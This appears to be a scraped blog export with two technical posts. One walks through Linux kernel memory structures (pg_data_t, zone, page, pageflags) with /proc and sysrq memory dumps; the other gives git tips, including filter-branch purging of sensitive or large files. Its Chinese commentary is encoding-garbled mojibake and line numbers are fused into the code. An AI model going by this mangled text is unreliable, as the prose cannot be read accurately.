*node_page_cgroup;#endif#endif#ifndef CONFIG_NO_BOOTMEM struct bootmem_data *bdata;#endif#ifdef CONFIG_MEMORY_HOTPLUG /* * Must be held any time you expect node_start_pfn, node_present_pages * or node_spanned_pages stay constant. Holding this will also * guarantee that any pfn_valid() stays that way. * * Nests above zone-&gt;lock and zone-&gt;size_seqlock. */ spinlock_t node_size_lock;#endif unsigned long node_start_pfn; unsigned long node_present_pages; /* total number of physical pages */ unsigned long node_spanned_pages; /* total size of physical page range, including holes */ int node_id; nodemask_t reclaim_nodes; /* Nodes allowed to reclaim from */ wait_queue_head_t kswapd_wait; wait_queue_head_t pfmemalloc_wait; struct task_struct *kswapd; /* Protected by lock_memory_hotplug() */ int kswapd_max_order; enum zone_type classzone_idx;#ifdef CONFIG_NUMA_BALANCING /* * Lock serializing the per destination node AutoNUMA memory * migration rate limiting data. */ spinlock_t numabalancing_migrate_lock; /* Rate limiting time interval */ unsigned long numabalancing_migrate_next_window; /* Number of pages migrated during the rate limiting time interval */ unsigned long numabalancing_migrate_nr_pages;#endif&#125; pg_data_t; æ¯ä¸€ä¸ª node ä¸‹é¢åˆåˆ†ä¸ºå‡ ä¸ª zoneï¼Œå¯ä»¥çœ‹åˆ°ä¼™ä¼´ç³»ç»Ÿæ˜¯åœ¨ zone é‡Œé¢ç©çš„ï¼Œå†…å­˜å›æ”¶ä¹Ÿæ˜¯åœ¨ zone é‡Œé¢ç©çš„ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178struct zone &#123;\t/* Fields commonly accessed by the page allocator */\t/* zone watermarks, access with *_wmark_pages(zone) macros */\tunsigned long watermark[NR_WMARK];\t/* * When free pages are below this point, additional steps are taken * when reading the number of free pages to avoid per-cpu counter * drift allowing watermarks to be breached */\tunsigned long percpu_drift_mark;\t/* * We don&#x27;t know if the memory that we&#x27;re going to allocate will be freeable * or/and it will be released eventually, so to avoid totally wasting several * GB of ram we must reserve some of the lower zone memory (otherwise we risk * to run OOM on the lower zones despite there&#x27;s tons of freeable ram * on the higher zones). This array is recalculated at runtime if the * sysctl_lowmem_reserve_ratio sysctl changes. */\tunsigned long lowmem_reserve[MAX_NR_ZONES];\t/* * This is a per-zone reserve of pages that should not be * considered dirtyable memory. */\tunsigned long dirty_balance_reserve;#ifdef CONFIG_NUMA\tint node;\t/* * zone reclaim becomes active if more unmapped pages exist. */\tunsigned long min_unmapped_pages;\tunsigned long min_slab_pages;#endif\tstruct per_cpu_pageset __percpu *pageset;\t/* * free areas of different sizes */\tspinlock_t lock;\tint all_unreclaimable; /* All pages pinned */#if defined CONFIG_COMPACTION || defined CONFIG_CMA\t/* Set to true when the PG_migrate_skip bits should be cleared */\tbool compact_blockskip_flush;\t/* pfns where compaction scanners should start */\tunsigned long compact_cached_free_pfn;\tunsigned long compact_cached_migrate_pfn;#endif#ifdef CONFIG_MEMORY_HOTPLUG\t/* see spanned/present_pages for more description */\tseqlock_t span_seqlock;#endif\tstruct free_area\tfree_area[MAX_ORDER];#ifndef CONFIG_SPARSEMEM\t/* * Flags for a pageblock_nr_pages block. See pageblock-flags.h. * In SPARSEMEM, this map is stored in struct mem_section */\tunsigned long *pageblock_flags;#endif /* CONFIG_SPARSEMEM */#ifdef CONFIG_COMPACTION\t/* * On compaction failure, 1&lt;&lt;compact_defer_shift compactions * are skipped before trying again. The number attempted since * last failure is tracked with compact_considered. */\tunsigned int compact_considered;\tunsigned int compact_defer_shift;\tint compact_order_failed;#endif\tZONE_PADDING(_pad1_)\t/* Fields commonly accessed by the page reclaim scanner */\tspinlock_t lru_lock;\tstruct lruvec lruvec;\tunsigned long pages_scanned; /* since last reclaim */\tunsigned long flags; /* zone flags, see below */\t/* Zone statistics */\tatomic_long_t vm_stat[NR_VM_ZONE_STAT_ITEMS];\t/* * The target ratio of ACTIVE_ANON to INACTIVE_ANON pages on * this zone&#x27;s LRU. Maintained by the pageout code. */\tunsigned int inactive_ratio;\tZONE_PADDING(_pad2_)\t/* Rarely used or read-mostly fields */\t/* * wait_table -- the array holding the hash table * wait_table_hash_nr_entries\t-- the size of the hash table array * wait_table_bits\t-- wait_table_size == (1 &lt;&lt; wait_table_bits) * * The purpose of all these is to keep track of the people * waiting for a page to become available and make them * runnable again when possible. The trouble is that this * consumes a lot of space, especially when so few things * wait on pages at a given time. So instead of using * per-page waitqueues, we use a waitqueue hash table. * * The bucket discipline is to sleep on the same queue when * colliding and wake all in that wait queue when removing. * When something wakes, it must check to be sure its page is * truly available, a la thundering herd. The cost of a * collision is great, but given the expected load of the * table, they should be so rare as to be outweighed by the * benefits from the saved space. * * __wait_on_page_locked() and unlock_page() in mm/filemap.c, are the * primary users of these fields, and in mm/page_alloc.c * free_area_init_core() performs the initialization of them. */\twait_queue_head_t\t* wait_table;\tunsigned long wait_table_hash_nr_entries;\tunsigned long wait_table_bits;\t/* * Discontig memory support fields. */\tstruct pglist_data\t*zone_pgdat;\t/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */\tunsigned long zone_start_pfn;\t/* * spanned_pages is the total pages spanned by the zone, including * holes, which is calculated as: * spanned_pages = zone_end_pfn - zone_start_pfn; * * present_pages is physical pages existing within the zone, which * is calculated as: *\tpresent_pages = spanned_pages - absent_pages(pages in holes); * * managed_pages is present pages managed by the buddy system, which * is calculated as (reserved_pages includes pages allocated by the * bootmem allocator): *\tmanaged_pages = present_pages - reserved_pages; * * So present_pages may be used by memory hotplug or memory power * management logic to figure out unmanaged pages by checking * (present_pages - managed_pages). And managed_pages should be used * by page allocator and vm scanner to calculate all kinds of watermarks * and thresholds. * * Locking rules: * * zone_start_pfn and spanned_pages are protected by span_seqlock. * It is a seqlock because it has to be read outside of zone-&gt;lock, * and it is done in the main allocator path. But, it is written * quite infrequently. * * The span_seq lock is declared along with zone-&gt;lock because it is * frequently read in proximity to zone-&gt;lock. It&#x27;s good to * give them a chance of being in the same cacheline. * * Write access to present_pages and managed_pages at runtime should * be protected by lock_memory_hotplug()/unlock_memory_hotplug(). * Any reader who can&#x27;t tolerant drift of present_pages and * managed_pages should hold memory hotplug lock to get a stable value. */\tunsigned long spanned_pages;\tunsigned long present_pages;\tunsigned long managed_pages;\t/* * rarely used fields: */\tconst char *name;&#125; ____cacheline_internodealigned_in_smp; é…åˆç€çŒœå’Œæ³¨é‡Šä»¥åŠå‘½åè¿˜æ˜¯èƒ½ç†è§£ä¸ªå¤§æ¦‚çš„ï¼Œä¸è¿‡æœ‰ä¸ªç»†èŠ‚æ˜¯å¼€å‘è€… æ§åˆ¶ä»£ç ç”Ÿæˆè€Œæ·»åŠ çš„ ____cacheline_internodealigned_in_smpå…¶å®è¿˜æ˜¯éå¸¸å€¼å¾—è¯´åˆ°ï¼Œæ”¾åœ¨è¿™é‡Œçš„æ„æ€å°±æ˜¯â€é¿å…æ¯ä¸ª CPU åœ¨å¯¹å±äºè‡ªå·±çš„é‚£ä¸ª map è¯»å†™æ—¶é€ æˆ false sharingâ€ï¼Œå®ç°æ˜¯ç”Ÿäº§æ–°çš„ sectionï¼š .data..cacheline_alignedï¼Œè€Œåäº¤ç»™ kernel linker è„šæœ¬å¤„ç†ï¼Œä¸€èˆ¬è¯´æ˜è¿™æ˜¯ä¸ªå¤šå¤„ç†å™¨ä½“ç³»ç»“æ„ä¸‹çš„å…³é”®æ•°æ®ç»“æ„ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950enum zone_type &#123;#ifdef CONFIG_ZONE_DMA /* * ZONE_DMA is used when there are devices that are not able * to do DMA to all of addressable memory (ZONE_NORMAL). Then we * carve out the portion of memory that is needed for these devices. * The range is arch specific. * * Some examples * * Architecture Limit * --------------------------- * parisc, ia64, sparc &lt;4G * s390 &lt;2G * arm Various * alpha Unlimited or 0-16MB. * * i386, x86_64 and multiple other arches * &lt;16M. */ ZONE_DMA,#endif#ifdef CONFIG_ZONE_DMA32 /* * x86_64 needs two ZONE_DMAs because it supports devices that are * only able to do DMA to the lower 16M but also 32 bit devices that * can only do DMA areas below 4G. */ ZONE_DMA32,#endif /* * Normal addressable memory is in ZONE_NORMAL. DMA operations can be * performed on pages in ZONE_NORMAL if the DMA devices support * transfers to all addressable memory. */ ZONE_NORMAL,#ifdef CONFIG_HIGHMEM /* * A memory area that is only addressable by the kernel through * mapping portions into its own address space. This is for example * used by i386 to allow the kernel to address the memory beyond * 900MB. The kernel will set up special mappings (page * table entries on i386) for each page that the kernel needs to * access. */ ZONE_HIGHMEM,#endif ZONE_MOVABLE, __MAX_NR_ZONES&#125;; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153/* * Each physical page in the system has a struct page associated with * it to keep track of whatever it is we are using the page for at the * moment. Note that we have no way to track which tasks are using * a page, though if it is a pagecache page, rmap structures can tell us * who is mapping it. * * The objects in struct page are organized in double word blocks in * order to allows us to use atomic double word operations on portions * of struct page. That is currently only used by slub but the arrangement * allows the use of atomic double word operations on the flags/mapping * and lru list pointers also. */struct page &#123;\t/* First double word block */\tunsigned long flags; /* Atomic flags, some possibly * updated asynchronously */\tstruct address_space *mapping;\t/* If low bit clear, points to * inode address_space, or NULL. * If page mapped as anonymous * memory, low bit is set, and * it points to anon_vma object: * see PAGE_MAPPING_ANON below. */\t/* Second double word */\tstruct &#123; union &#123; pgoff_t index; /* Our offset within mapping. */ void *freelist; /* slub/slob first free object */ bool pfmemalloc;\t/* If set by the page allocator, * ALLOC_NO_WATERMARKS was set * and the low watermark was not * met implying that the system * is under some pressure. The * caller should try ensure * this page is only used to * free other pages. */ &#125;; union &#123;#if defined(CONFIG_HAVE_CMPXCHG_DOUBLE) &amp;&amp; \\\tdefined(CONFIG_HAVE_ALIGNED_STRUCT_PAGE) /* Used for cmpxchg_double in slub */ unsigned long counters;#else /* * Keep _count separate from slub cmpxchg_double data. * As the rest of the double word is protected by * slab_lock but _count is not. */ unsigned counters;#endif struct &#123; union &#123; /* * Count of ptes mapped in * mms, to show when page is * mapped &amp; limit reverse map * searches. * * Used also for tail pages * refcounting instead of * _count. Tail pages cannot * be mapped and keeping the * tail page _count zero at * all times guarantees * get_page_unless_zero() will * never succeed on tail * pages. */ atomic_t _mapcount; struct &#123; /* SLUB */ unsigned inuse:16; unsigned objects:15; unsigned frozen:1; &#125;; int units;\t/* SLOB */ &#125;; atomic_t _count; /* Usage count, see below. */ &#125;; &#125;;\t&#125;;\t/* Third double word block */\tunion &#123; struct list_head lru;\t/* Pageout list, eg. active_list * protected by zone-&gt;lru_lock ! */ struct &#123; /* slub per cpu partial pages */ struct page *next;\t/* Next partial slab */#ifdef CONFIG_64BIT int pages;\t/* Nr of partial slabs left */ int pobjects;\t/* Approximate # of objects */#else short int pages; short int pobjects;#endif &#125;; struct list_head list;\t/* slobs list of pages */ struct slab *slab_page; /* slab fields */\t&#125;;\t/* Remainder is not double word aligned */\tunion &#123; unsigned long private; /* Mapping-private opaque data: * usually used for buffer_heads * if PagePrivate set; used for * swp_entry_t if PageSwapCache; * indicates order in the buddy * system if PG_buddy is set. */#if USE_SPLIT_PTLOCKS spinlock_t ptl;#endif struct kmem_cache *slab_cache;\t/* SL[AU]B: Pointer to slab */ struct page *first_page;\t/* Compound tail pages */\t&#125;;\t/* * On machines where all RAM is mapped into kernel address space, * we can simply calculate the virtual address. On machines with * highmem some memory is mapped into kernel virtual memory * dynamically, so we need a place to store that address. * Note that this field could be 16 bits on x86 ... ;) * * Architectures with slow multiplication can define * WANT_PAGE_VIRTUAL in asm/page.h */#if defined(WANT_PAGE_VIRTUAL)\tvoid *virtual; /* Kernel virtual address (NULL if not kmapped, ie. highmem) */#endif /* WANT_PAGE_VIRTUAL */#ifdef CONFIG_WANT_PAGE_DEBUG_FLAGS\tunsigned long debug_flags;\t/* Use atomic bitops on this */#endif#ifdef CONFIG_KMEMCHECK\t/* * kmemcheck wants to track the status of each byte in a page; this * is a pointer to such a status block. NULL if not tracked. */\tvoid *shadow;#endif#ifdef LAST_NID_NOT_IN_PAGE_FLAGS\tint _last_nid;#endif&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114/* * Various page-&gt;flags bits: * * PG_reserved is set for special pages, which can never be swapped out. Some * of them might not even exist (eg empty_bad_page)... * * The PG_private bitflag is set on pagecache pages if they contain filesystem * specific data (which is normally at page-&gt;private). It can be used by * private allocations for its own usage. * * During initiation of disk I/O, PG_locked is set. This bit is set before I/O * and cleared when writeback _starts_ or when read _completes_. PG_writeback * is set before writeback starts and cleared when it finishes. * * PG_locked also pins a page in pagecache, and blocks truncation of the file * while it is held. * * page_waitqueue(page) is a wait queue of all tasks waiting for the page * to become unlocked. * * PG_uptodate tells whether the page&#x27;s contents is valid. When a read * completes, the page becomes uptodate, unless a disk I/O error happened. * * PG_referenced, PG_reclaim are used for page reclaim for anonymous and * file-backed pagecache (see mm/vmscan.c). * * PG_error is set to indicate that an I/O error occurred on this page. * * PG_arch_1 is an architecture specific page state bit. The generic code * guarantees that this bit is cleared for a page when it first is entered into * the page cache. * * PG_highmem pages are not permanently mapped into the kernel virtual address * space, they need to be kmapped separately for doing IO on the pages. The * struct page (these bits with information) are always mapped into kernel * address space... * * PG_hwpoison indicates that a page got corrupted in hardware and contains * data with incorrect ECC bits that triggered a machine check. Accessing is * not safe since it may cause another machine check. Don&#x27;t touch! *//* * Don&#x27;t use the *_dontuse flags. Use the macros. Otherwise you&#x27;ll break * locked- and dirty-page accounting. * * The page flags field is split into two parts, the main flags area * which extends from the low bits upwards, and the fields area which * extends from the high bits downwards. * * | FIELD | ... | FLAGS | * N-1 ^ 0 * (NR_PAGEFLAGS) * * The fields area is reserved for fields mapping zone, node (for NUMA) and * SPARSEMEM section (for variants of SPARSEMEM that require section ids like * SPARSEMEM_EXTREME with !SPARSEMEM_VMEMMAP). */enum pageflags &#123;\tPG_locked, /* Page is locked. Don&#x27;t touch. */\tPG_error,\tPG_referenced,\tPG_uptodate,\tPG_dirty,\tPG_lru,\tPG_active,\tPG_slab,\tPG_owner_priv_1,\t/* Owner use. If pagecache, fs may use*/\tPG_arch_1,\tPG_reserved,\tPG_private, /* If pagecache, has fs-private data */\tPG_private_2, /* If pagecache, has fs aux data */\tPG_writeback, /* Page is under writeback */#ifdef CONFIG_PAGEFLAGS_EXTENDED\tPG_head, /* A head page */\tPG_tail, /* A tail page */#else\tPG_compound, /* A compound page */#endif\tPG_swapcache, /* Swap page: swp_entry_t in private */\tPG_mappedtodisk,\t/* Has blocks allocated on-disk */\tPG_reclaim, /* To be reclaimed asap */\tPG_swapbacked, /* Page is backed by RAM/swap */\tPG_unevictable, /* Page is &quot;unevictable&quot; */#ifdef CONFIG_MMU\tPG_mlocked, /* Page is vma mlocked */#endif#ifdef CONFIG_ARCH_USES_PG_UNCACHED\tPG_uncached, /* Page has been mapped as uncached */#endif#ifdef CONFIG_MEMORY_FAILURE\tPG_hwpoison, /* hardware poisoned page. Don&#x27;t touch */#endif#ifdef CONFIG_TRANSPARENT_HUGEPAGE\tPG_compound_lock,#endif\t__NR_PAGEFLAGS,\t/* Filesystems */\tPG_checked = PG_owner_priv_1,\t/* Two page bits are conscripted by FS-Cache to maintain local caching * state. These bits are set on pages belonging to the netfs&#x27;s inodes * when those inodes are being locally cached. */\tPG_fscache = PG_private_2,\t/* page backed by cache */\t/* XEN */\tPG_pinned = PG_owner_priv_1,\tPG_savepinned = PG_dirty,\t/* SLOB */\tPG_slob_free = PG_private,&#125;; debug 1234567891011121314151617181920212223242526272829localhost linux (f722406faae2*) # cat /proc/zoneinfoNode 0, zone DMA per-node stats nr_inactive_anon 736 nr_active_anon 72656 nr_inactive_file 75051 nr_active_file 27954 nr_unevictable 0 nr_isolated_anon 0 nr_isolated_file 0 workingset_refault 0 workingset_activate 0 workingset_nodereclaim 0 nr_anon_pages 72428 nr_mapped 38197 nr_file_pages 103951 nr_dirty 0 nr_writeback 0 nr_writeback_temp 0 nr_shmem 946 nr_shmem_hugepages 0 nr_shmem_pmdmapped 0 nr_anon_transparent_hugepages 0 nr_unstable 0 nr_vmscan_write 0 nr_vmscan_immediate_reclaim 0 nr_dirtied 12449 nr_written 11323 ... 12345678910111213141516171819202122232425262728localhost linux (f722406faae2*) # cat /proc/pagetypeinfoPage block order: 9Pages per block: 512Free pages count per migrate type at order 0 1 2 3 4 5 6 7 8 9 10Node 0, zone DMA, type Unmovable 0 0 0 0 2 1 1 0 1 0 0Node 0, zone DMA, type Movable 0 0 0 0 0 0 0 0 0 1 3Node 0, zone DMA, type Reclaimable 0 0 0 0 0 0 0 0 0 0 0Node 0, zone DMA, type HighAtomic 0 0 0 0 0 0 0 0 0 0 0Node 0, zone DMA, type CMA 0 0 0 0 0 0 0 0 0 0 0Node 0, zone DMA, type Isolate 0 0 0 0 0 0 0 0 0 0 0Node 0, zone DMA32, type Unmovable 115 39 6 0 0 0 0 0 0 1 0Node 0, zone DMA32, type Movable 109 182 149 59 17 1 1 0 0 1 675Node 0, zone DMA32, type Reclaimable 1 0 0 1 1 1 0 0 1 1 0Node 0, zone DMA32, type HighAtomic 0 0 0 0 0 0 0 0 0 0 0Node 0, zone DMA32, type CMA 0 0 0 0 0 0 0 0 0 0 0Node 0, zone DMA32, type Isolate 0 0 0 0 0 0 0 0 0 0 0Node 0, zone Normal, type Unmovable 31 6 4 5 2 2 0 0 1 1 0Node 0, zone Normal, type Movable 10 3 1 3 1 1 1 0 0 0 4Node 0, zone Normal, type Reclaimable 0 1 2 1 2 1 0 0 0 0 0Node 0, zone Normal, type HighAtomic 0 0 0 0 0 0 0 0 0 0 0Node 0, zone Normal, type CMA 0 0 0 0 0 0 0 0 0 0 0Node 0, zone Normal, type Isolate 0 0 0 0 0 0 0 0 0 0 0Number of blocks type Unmovable Movable Reclaimable HighAtomic CMA IsolateNode 0, zone DMA 1 7 0 0 0 0Node 0, zone DMA32 6 1518 4 0 0 0Node 0, zone Normal 102 336 74 0 0 0 1234567891011121314151617181920212223242526272829303132localhost linux (f722406faae2*) # cat /sys/devices/system/node/node*/meminfoNode 0 MemTotal: 3893860 kBNode 0 MemFree: 2816460 kBNode 0 MemUsed: 1077400 kBNode 0 Active: 402968 kBNode 0 Inactive: 303324 kBNode 0 Active(anon): 291136 kBNode 0 Inactive(anon): 2944 kBNode 0 Active(file): 111832 kBNode 0 Inactive(file): 300380 kBNode 0 Unevictable: 0 kBNode 0 Mlocked: 0 kBNode 0 Dirty: 4 kBNode 0 Writeback: 0 kBNode 0 FilePages: 415996 kBNode 0 Mapped: 152788 kBNode 0 AnonPages: 290224 kBNode 0 Shmem: 3784 kBNode 0 KernelStack: 5232 kBNode 0 PageTables: 10648 kBNode 0 NFS_Unstable: 0 kBNode 0 Bounce: 0 kBNode 0 WritebackTmp: 0 kBNode 0 Slab: 207012 kBNode 0 SReclaimable: 155908 kBNode 0 SUnreclaim: 51104 kBNode 0 AnonHugePages: 0 kBNode 0 ShmemHugePages: 0 kBNode 0 ShmemPmdMapped: 0 kBNode 0 HugePages_Total: 0Node 0 HugePages_Free: 0Node 0 HugePages_Surp: 0 123456789101112131415161718192021222324252627282930313233localhost linux (f722406faae2*) # echo 1 &gt; /proc/sys/kernel/sysrqlocalhost linux (f722406faae2*) # echo m &gt; /proc/sysrq-triggerlocalhost linux (f722406faae2*) # dmesg[ 6392.495199] sysrq: SysRq : Show Memory[ 6392.495830] Mem-Info:[ 6392.495837] active_anon:72784 inactive_anon:736 isolated_anon:0 active_file:27975 inactive_file:75079 isolated_file:0 unevictable:0 dirty:0 writeback:0 unstable:0 slab_reclaimable:39027 slab_unreclaimable:12767 mapped:38197 shmem:946 pagetables:2662 bounce:0 free:704008 free_pcp:1316 free_cma:0[ 6392.495840] Node 0 active_anon:291136kB inactive_anon:2944kB active_file:111900kB inactive_file:300316kB unevictable:0kB isolated(anon):0kB isolated(file):0kB mapped:152788kB dirty:0kB writeback:0kB shmem:3784kB shmem_thp: 0kB shmem_pmdmapped: 0kB anon_thp: 0kB writeback_tmp:0kB unstable:0kB all_unreclaimable? no[ 6392.495841] Node 0 DMA free:15872kB min:276kB low:344kB high:412kB active_anon:0kB inactive_anon:0kB active_file:0kB inactive_file:0kB unevictable:0kB writepending:0kB present:15988kB managed:15904kB mlocked:0kB slab_reclaimable:0kB slab_unreclaimable:32kB kernel_stack:0kB pagetables:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB[ 6392.495845] lowmem_reserve[]: 0 2823 3763 3763 3763[ 6392.495848] Node 0 DMA32 free:2779228kB min:50496kB low:63120kB high:75744kB active_anon:94688kB inactive_anon:12kB active_file:2268kB inactive_file:22864kB unevictable:0kB writepending:0kB present:3129152kB managed:2915512kB mlocked:0kB slab_reclaimable:4972kB slab_unreclaimable:4416kB kernel_stack:640kB pagetables:1248kB bounce:0kB free_pcp:2624kB local_pcp:668kB free_cma:0kB[ 6392.495852] lowmem_reserve[]: 0 0 939 939 939[ 6392.495854] Node 0 Normal free:20932kB min:16808kB low:21008kB high:25208kB active_anon:196448kB inactive_anon:2932kB active_file:109632kB inactive_file:277452kB unevictable:0kB writepending:0kB present:1048576kB managed:962444kB mlocked:0kB slab_reclaimable:151136kB slab_unreclaimable:46620kB kernel_stack:4592kB pagetables:9400kB bounce:0kB free_pcp:2640kB local_pcp:664kB free_cma:0kB[ 6392.495858] lowmem_reserve[]: 0 0 0 0 0[ 6392.495860] Node 0 DMA: 0*4kB 0*8kB 0*16kB 0*32kB 2*64kB (U) 1*128kB (U) 1*256kB (U) 0*512kB 1*1024kB (U) 1*2048kB (M) 3*4096kB (M) = 15872kB[ 6392.495881] Node 0 DMA32: 345*4kB (UME) 285*8kB (UM) 189*16kB (UME) 32*32kB (UM) 1*64kB (M) 2*128kB (UE) 1*256kB (U) 2*512kB (UM) 3*1024kB (UME) 1*2048kB (E) 675*4096kB (M) = 2779228kB[ 6392.495893] Node 0 Normal: 21*4kB (M) 4*8kB (UM) 3*16kB (UME) 5*32kB (UME) 4*64kB (UME) 3*128kB (UM) 2*256kB (ME) 0*512kB 1*1024kB (U) 1*2048kB (U) 4*4096kB (M) = 20932kB[ 6392.495905] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=1048576kB[ 6392.495906] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=2048kB[ 6392.495907] 104000 total pagecache pages[ 6392.495908] 0 pages in swap cache[ 6392.495909] Swap cache stats: add 0, delete 0, find 0/0[ 6392.495910] Free swap = 2097148kB[ 6392.495910] Total swap = 2097148kB[ 6392.495911] 1048429 pages RAM[ 6392.495912] 0 pages HighMem/MovableOnly[ 6392.495912] 74964 pages reserved[ 6392.495913] 0 pages cma reserved[ 6392.495913] 0 pages hwpoisoned","tags":["linux"]},{"title":"git usage","path":"/2016/11/01/git/","content":"0x00 workflowgit çš„å·¥ä½œæµç¨‹ï¼Œå·² k8s devel çš„å¼€å‘è€…æ–‡æ¡£é‡Œé¢å›¾æ¥è¯´æ˜ï¼š workflow é¦–å…ˆåœ¨ fork ä»£ç ï¼Œç„¶å clone åˆ°æœ¬åœ°ï¼Œåˆ›å»ºåˆ†æ”¯å¹¶ä¿®æ”¹ä»£ç ï¼Œcommit å‘ PR æˆ–è€… rebase&#x2F;fetch åˆ«äººçš„ä»£ç åä¿®æ”¹å‘ PR. 0x01 tips Merge another branch of the same git-repo 1git merge branch-name Pick up a specific commit from another branch 1git cherry-pick commit-name Merge a branch from another local git repo 1git pull /path/to/git-repo branch-name Rebase your commits 1git rebase -i commit-nameË† Rebase a branch onto master 1git rebase â€“onto master â€“root Delete a remote branch 1git push origin :branch Example of generate and release kernel patches Generate patches1git format-patch -s â€“cover-letter â€“thread commit1Ë†..commit2 â€“cc=&quot;Name &lt;user@example.com&gt;&quot; Check&amp;fix up your patches Documentation/SubmitChecklist, script/checkpatch.pl cleanfile Release your patches Config send-email:1git config, man git-send-email(Sending) Get maintainers:1./scripts/get maintainer.pl Send out your patch:1git send-email â€“to=â€LKML &lt;linux-kernel@vger.kernel.org&gt;â€ â€“cc=&quot;Maintainersâ€™ Email Address&quot; 0x10 filter-branchgit çš„æœ¬è´¨æ˜¯å†…å®¹å¯»å€æ–‡ä»¶ç³»ç»Ÿï¼Œæœ‰æ—¶å€™éœ€è¦ undo æ“ä½œæ¶ˆé™¤æ•æ„Ÿä¿¡æ¯æ˜¯ä¸å¤Ÿçš„ï¼Œå…³äºæ›´å¤š git åº•å±‚ä¿¡æ¯å‚è€ƒ progit^progit.æœ‰æ—¶å€™è„‘æŠ½äº†ï¼ŒæŠŠæ•æ„Ÿèµ„æ–™æˆ–è€…ä¸€ä¸ªå¤§çš„ binary commit ä¸Šå»äº†ï¼Œæƒ³è¦è¡¥æ•‘ã€‚ 0x11 Clear sensitive files12345678910111213$ ls password password$ git filter-branch --index-filter &quot;git rm -rf --cached --ignore-unmatch password&quot; --prune-empty -- --all Rewrite be0acf636754aea731c0b1f285142143dbf0275f (2/3) (0 seconds passed, remaining 0 predicted) rm &#x27;password&#x27;Rewrite c3cc58dc9ebe7cf1f3187a0a6172e1bb274b3921 (3/3) (0 seconds passed, remaining 0 predicted) rm &#x27;password&#x27;Ref &#x27;refs/heads/master&#x27; was rewritten$ lschcon init$ git show 100644fatal: ambiguous argument &#x27;100644&#x27;: unknown revision or path not in the working tree.Use &#x27;--&#x27; to separate paths from revisions, like this:&#x27;git &lt;command&gt; [&lt;revision&gt;...] -- [&lt;file&gt;...]&#x27; 0x12 remove the largest fileé€šè¿‡ git é˜…è¯»ç´¢å¼•æ–‡ä»¶ (æ‹“å±•å.idx),ç¡®è®¤å“ªä¸ª object æœ€å¤§ 1234$ git verify-pack -v .git/objects/pack/pack-f92ea95d8f9a18dd42335fc3e3bd25feb8ed5ef8.idx | sort -k 3 -n | tail -31d07197534891b5d45286850f7202dc1f84beceb blob 2885745 2873595 1124278061ba4967a562aaff8d1208981a2f1be968c969fd blob 8929280 3255190 3940716353a62618f023052c25db90d5c3f6725cadfbd95 blob 9263612 2936691 73858887 æŸ¥çœ‹ä½“ç§¯æœ€å¤§çš„ hash å±äºå“ªä¸ªæ–‡ä»¶ 12$ git rev-list --objects --all | grep 353a62618f023052c25db90d5c3f6725cadfbd95353a62618f023052c25db90d5c3f6725cadfbd95 vendor/github.com/go-openapi/spec/debug.test ç¡®è®¤è¯¥æ–‡ä»¶å±äºå“ªä¸ª commit 12$ git --no-pager log --pretty=oneline --branches -- vendor/github.com/go-openapi/spec/debug.test da1f2c61c603e1cadc89e2cc690d46d2f972501e Update vendor packages (#1378) è¦ç§»é™¤è¿™ä¸ªæ–‡ä»¶éœ€è¦åˆ©ç”¨ filter-barch é‡å†™è‡ªda1f2c61c603e1cadc89e2cc690d46d2f972501eçš„å…¨éƒ¨å†å²ï¼Œæ³¨æ„ commitid åé¢çš„^ä¸.. 12345678910$ git filter-branch --index-filter &#x27;git rm --cached --ignore-unmatch vendor/github.com/go-openapi/spec/debug.test&#x27; -- da1f2c61c603e1cadc89e2cc690d46d2f972501e^..Rewrite da1f2c61c603e1cadc89e2cc690d46d2f972501e (1/8) (0 seconds passed, remaining 0 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Rewrite 8c83a03a1b84fd18830b8bfaf1ea09ba5cc93e78 (2/8) (0 seconds passed, remaining 0 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Rewrite 3fe627bb58a2f081a7976a13dd0b014c5c882bcb (3/8) (0 seconds passed, remaining 0 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Rewrite dd3ef7d823313445774d2ed577f67d2da37a1568 (4/8) (1 seconds passed, remaining 1 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Rewrite 0b0bafce155f20be369f35da045fb6338bf38e24 (4/8) (1 seconds passed, remaining 1 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Rewrite fd18f0e6895bbfc144051e928d8c77a110fb2978 (4/8) (1 seconds passed, remaining 1 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Rewrite 69e2d04e0f4f69f9c6c0c5d24b4b6b07490d347d (4/8) (1 seconds passed, remaining 1 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Rewrite 645191d3ff4cf9e898c9e5796b86dc010c095630 (4/8) (1 seconds passed, remaining 1 predicted) rm &#x27;vendor/github.com/go-openapi/spec/debug.test&#x27;Ref &#x27;refs/heads/master&#x27; was rewritten æ¸…ç† reflog å¯¹è±¡ 12345678$ rm -Rf .git/refs/original$ rm -Rf .git/logs/$ git gcCounting objects: 36023, done.Delta compression using up to 4 threads.Compressing objects: 100% (18106/18106), done.Writing objects: 100% (36023/36023), done.Total 36023 (delta 16535), reused 35996 (delta 16515) å¯¹æ¯”ä¸€ä¸‹æ¸…ç†å‰åï¼Œå…¶ä¸­size-packæ˜¯ä»¥ kB ä¸ºå•ä½è¿›è¡Œè®°å½•å¤§å°çš„ã€‚ 12345678910111213141516171819$ git count-objects -vcount: 0size: 0in-pack: 36023packs: 1size-pack: 77904prune-packable: 0garbage: 0size-garbage: 0$ git count-objects -vcount: 0size: 0in-pack: 36003packs: 1size-pack: 77911prune-packable: 